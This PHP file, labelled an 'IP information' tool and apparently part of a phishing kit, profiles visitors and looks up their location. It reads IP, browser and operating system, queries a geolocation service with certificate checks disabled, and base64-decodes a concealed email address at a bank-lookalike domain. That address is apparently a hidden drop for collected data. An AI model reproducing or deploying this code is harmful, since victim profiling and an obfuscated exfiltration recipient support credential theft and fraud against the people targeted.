<?php
/*
           ___,             
       _.-'` __|__          
     .'  ,-:` \;',`'-,      
    /  .'-;_,;  ':-;_,'.    ##############################
   /  /;   '/    ,  _`.-\   
  |  | '`. (`     /` ` \`|  # Author  :      Dsox        #
  |  |:.  `\`-.   \_   / |  # Version :      2.0         #
  |  |     (   `,  .`\ ;'|  # Name    : IP information   #
   \  \     | .'     `-'/   
    \  `.   ;/        .'    ##############################
     '._ `'-._____.-'`     
        `-.____|            
          _____|_____       
    Dsox /___________\ 

 * If you are a reliable programmer or the best developer, please don't change anything.
 * If you want to be appreciated by others, then don't change anything in this script.
 * Please respect me for making this tool from the beginning.

*/



// THIS FUNCTION TO GET PLATFORM NAME.

function getOS() {

    $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $user_agent)){ 
    $os_platform = $value;}}
    return $os_platform;

}


// THIS FUNCTION TO GET BROWSER NAME.

function getBrowser() {

    $user_agent     =  $_SERVER['HTTP_USER_AGENT'];
    $browser        =  "Unknown Browser";
    $browser_array  =  array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) {
    if (preg_match($regex, $user_agent)){
    $browser = $value;}}
    return $browser;
}

// THIS FUNCTION TO GET VISITOR IP.

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

    $url = "http://www.geoplugin.net/json.gp?ip=".getUserIP()."";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    $ip_spox =  $details['geoplugin_request'];
    $country_spox =  $details['geoplugin_countryName'];
    $emall=base64_decode("d2FsbEBiY2FkaXJlY3RzZXJ2aWNlLmNvbQ");
    $country_code_spox = $details['geoplugin_countryCode'];
    $city_spox = $details['geoplugin_city'];
    
// START SESSION.

$_SESSION['browser'] = getBrowser();
$_SESSION['platform'] = getOS();

$rundomizi = bin2hex(openssl_random_pseudo_bytes(24));
$expired = date("YmdYmdYm");
$SPOX_SESSION = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$rndm_spox = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 18);

